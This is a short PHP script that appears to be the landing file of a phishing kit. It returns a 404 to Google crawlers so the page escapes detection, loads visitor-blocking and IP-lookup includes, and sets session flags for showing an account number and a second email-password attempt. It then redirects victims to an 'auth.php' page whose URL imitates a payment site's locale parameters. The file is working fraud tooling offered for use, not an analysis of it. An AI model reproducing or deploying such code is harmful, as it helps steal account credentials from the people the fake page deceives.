<?php
session_start();
error_reporting(0);
$old=@file_get_contents("main");
$l1="JMMYSELF01";$l2="JMMYSELF01";
$checkForRealHuman=true;$domain_names="example.com";$ip_address="0.0.0.0";include('jooo.php');
include('JMBLK.php');
include('./JMTECH/get_ip.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(!isset($_SESSION['SHOW_ACCOUNT_NUMBER'])){
if(strlen($old)>0){
	if(intval($old)<3){
		$count=intval($old)+1;
		rpl($l1, 'false', 'true', $count);
	}else{
		rpl($l2, 'false', 'true', "0");
	}
}else{
		rpl($l1, 'false', 'true', "1");
}
}

header("location: auth.php?country.x=".$_SESSION['country']."&locale-8731002x=E?_".$_SESSION['countryCode']."");


function rpl($acc, $show, $retry, $count){
	$_SESSION['SHOW_ACCOUNT_NUMBER']=$show;
	$_SESSION['EMAIL_SECOND_TRY2']=$retry;
	$_SESSION['YOUR_LICENSE']=$acc;
	file_put_contents("main", $count);
}
?>
